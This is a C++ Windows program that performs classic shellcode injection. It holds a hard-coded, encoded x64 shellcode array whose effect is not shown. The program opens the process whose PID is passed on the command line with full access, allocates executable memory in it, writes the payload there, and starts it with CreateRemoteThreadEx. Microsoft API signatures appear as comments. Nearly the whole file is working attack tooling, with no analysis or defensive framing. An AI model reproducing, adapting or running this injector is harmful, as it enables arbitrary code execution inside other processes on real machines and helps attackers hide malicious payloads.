#include <iostream>
#include <windows.h>
#include <string>



/*
  BOOL CreateProcessW(
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
 */

/*
  https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
  HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
 */

/*
  https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
  https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants
  LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
*/

/*
  https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
  BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
*/

/*
  https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex
  HANDLE CreateRemoteThreadEx(
  [in]            HANDLE                       hProcess,
  [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
  [in]            SIZE_T                       dwStackSize,
  [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
  [in, optional]  LPVOID                       lpParameter,
  [in]            DWORD                        dwCreationFlags,
  [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [out, optional] LPDWORD                      lpThreadId
);
 */

const char* s = "[+]";
const char* e = "[-]";

STARTUPINFOW si;
PROCESS_INFORMATION pi;
DWORD pid, tid = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

unsigned char shellCode[] =
"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x85\x6e\x9f\x25\x2f\x04\xf8\x7f\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x79\x26\x1c"
"\xc1\xdf\xec\x38\x7f\x85\x6e\xde\x74\x6e\x54\xaa\x2e\xd3"
"\x26\xae\xf7\x4a\x4c\x73\x2d\xe5\x26\x14\x77\x37\x4c\x73"
"\x2d\xa5\x26\x14\x57\x7f\x4c\xf7\xc8\xcf\x24\xd2\x14\xe6"
"\x4c\xc9\xbf\x29\x52\xfe\x59\x2d\x28\xd8\x3e\x44\xa7\x92"
"\x64\x2e\xc5\x1a\x92\xd7\x2f\xce\x6d\xa4\x56\xd8\xf4\xc7"
"\x52\xd7\x24\xff\x8f\x78\xf7\x85\x6e\x9f\x6d\xaa\xc4\x8c"
"\x18\xcd\x6f\x4f\x75\xa4\x4c\xe0\x3b\x0e\x2e\xbf\x6c\x2e"
"\xd4\x1b\x29\xcd\x91\x56\x64\xa4\x30\x70\x37\x84\xb8\xd2"
"\x14\xe6\x4c\xc9\xbf\x29\x2f\x5e\xec\x22\x45\xf9\xbe\xbd"
"\x8e\xea\xd4\x63\x07\xb4\x5b\x8d\x2b\xa6\xf4\x5a\xdc\xa0"
"\x3b\x0e\x2e\xbb\x6c\x2e\xd4\x9e\x3e\x0e\x62\xd7\x61\xa4"
"\x44\xe4\x36\x84\xbe\xde\xae\x2b\x8c\xb0\x7e\x55\x2f\xc7"
"\x64\x77\x5a\xa1\x25\xc4\x36\xde\x7c\x6e\x5e\xb0\xfc\x69"
"\x4e\xde\x77\xd0\xe4\xa0\x3e\xdc\x34\xd7\xae\x3d\xed\xaf"
"\x80\x7a\x91\xc2\x6d\x95\x05\xf8\x7f\x85\x6e\x9f\x25\x2f"
"\x4c\x75\xf2\x84\x6f\x9f\x25\x6e\xbe\xc9\xf4\xea\xe9\x60"
"\xf0\x94\xf4\x4d\xdd\xd3\x2f\x25\x83\xba\xb9\x65\x80\x50"
"\x26\x1c\xe1\x07\x38\xfe\x03\x8f\xee\x64\xc5\x5a\x01\x43"
"\x38\x96\x1c\xf0\x4f\x2f\x5d\xb9\xf6\x5f\x91\x4a\x46\x4e"
"\x68\x9b\x51\xe0\x16\xfa\x25\x2f\x04\xf8\x7f";


int SpawnProc()
{
	if (!CreateProcessW(
		L"C:\\Windows\\System32\\notepad.exe", // lpApplicationName
		NULL,
		NULL,
		NULL,
		FALSE,
		BELOW_NORMAL_PRIORITY_CLASS,
		NULL,
		NULL,
		&si,
		&pi
	))
	{
		printf("%s CreateProcessW() failed (%d)\n", e, GetLastError());
		return EXIT_FAILURE;
	}
	pid = pi.dwProcessId;
	printf("%s Process created with the PID (%ld)\n", s, pid);
	return pid;
}

int hookProc(DWORD pid)
{
	printf("%s Trying to open a handle to the process with the PID (%ld)\n", s, pid);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		printf("%s OpenProcess() failed (%d)\n", e, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Handle (0x%p) to the process with the PID (%ld) opened\n", s, hProcess, pid);
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellCode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s Allocated %zu-bytes\n", s, sizeof(shellCode));

	if (WriteProcessMemory(hProcess, rBuffer, shellCode, sizeof(shellCode), NULL) == 0)
	{
		printf("%s Error: %d\n", e, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s Wrote %zu-bytes to the process with pid %ld\n", s, sizeof(shellCode), pid);


	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &tid);

	if (hThread == NULL)
	{
		printf("%s Error creating remote thread: %d\n", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("%s Got a handle to the thread with tid %ld\n", s, tid);
	//comment out to keep the proc running (still closes the window)
	WaitForSingleObject(hThread, INFINITE);
	printf("%s Thread with tid %ld finished\n", s, tid);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	return EXIT_SUCCESS;
}

int main(int argc, char* argv[])
{
	if (argc < 2)
	{
		printf("%s Usage: %s <PID>\n", e, argv[0]);
		return EXIT_FAILURE;
	}
	pid = atoi(argv[1]);
	hookProc(pid);

	return EXIT_SUCCESS;
}